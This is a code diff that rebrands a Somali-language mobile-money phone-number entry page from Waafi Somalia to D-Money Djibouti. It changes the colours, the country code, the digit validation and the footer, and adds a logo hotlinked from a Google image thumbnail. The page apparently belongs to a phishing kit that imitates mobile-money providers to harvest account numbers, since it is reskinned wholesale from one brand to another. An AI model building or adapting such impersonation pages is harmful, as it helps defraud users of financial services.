@@ -26,7 +26,7 @@
         
         .nav-header {
             width: 100%;
-            background: linear-gradient(90deg, #a4e433 0%, #4caf50 100%);
+            background: linear-gradient(90deg, #5b2d8e 0%, #7c3aed 100%);
             padding: 16px 20px;
             color: white;
             display: flex;
@@ -40,9 +40,19 @@
             font-weight: 500;
         }
         
-        .waafi-logo {
+        .dmoney-logo {
             font-size: 22px;
             font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .dmoney-logo img {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            object-fit: cover;
         }
         
         .menu-icon {
@@ -74,7 +84,7 @@
         }
         
         .bar.active-bar {
-            background: #82d13d;
+            background: #7c3aed;
         }
         
         .input-wrap {
@@ -103,7 +113,7 @@
         }
         
         input:focus {
-            border-color: #82d13d;
+            border-color: #7c3aed;
             background: #fff;
         }
         
@@ -164,7 +174,7 @@
         }
         
         .next-btn {
-            background: #2e7d32;
+            background: #5b2d8e;
             color: white;
             border: none;
             padding: 17px;
@@ -178,7 +188,7 @@
         }
         
         .next-btn:active {
-            background: #1b5e20;
+            background: #432068;
         }
         
         .footer-text {
@@ -196,7 +206,10 @@
     <!-- Header -->
     <div class="nav-header">
         <div class="back-btn-header" onclick="goBack()">← Dib u noqo</div>
-        <div class="waafi-logo">Waafi</div>
+        <div class="dmoney-logo">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="D-Money">
+            <span>D-Money</span>
+        </div>
         <div class="menu-icon">☰</div>
     </div>
 
@@ -225,10 +238,10 @@
         <div class="input-wrap">
             <label for="phone">Lambarka Taleefanka</label>
             <div class="phone-container">
-                <div class="country-code">+252</div>
-                <input type="tel" id="phone" class="phone-input" placeholder="612345678" maxlength="9">
+                <div class="country-code">+253</div>
+                <input type="tel" id="phone" class="phone-input" placeholder="77123456" maxlength="8">
             </div>
-            <p class="phone-hint">Geli 9 tiro (tusaale: 612345678 ama 907654321)</p>
+            <p class="phone-hint">Geli 8 tiro (tusaale: 77123456 ama 81234567)</p>
         </div>
 
         <!-- Buttons -->
@@ -238,7 +251,7 @@
         </div>
     </div>
 
-    <div class="footer-text">© 2025 Waafi Soomaaliya</div>
+    <div class="footer-text">© 2025 D-Money Djibouti</div>
 
     <script>
         // ---------- Go to next page ----------
@@ -253,9 +266,9 @@
                 return;
             }
 
-            // Validate phone: exactly 9 digits
-            if (!/^\d{9}$/.test(phone)) {
-                alert("Geli number sax ah oo 9 tiro ah.");
+            // Validate phone: exactly 8 digits
+            if (!/^\d{8}$/.test(phone)) {
+                alert("Geli number sax ah oo 8 tiro ah.");
                 return;
             }
 
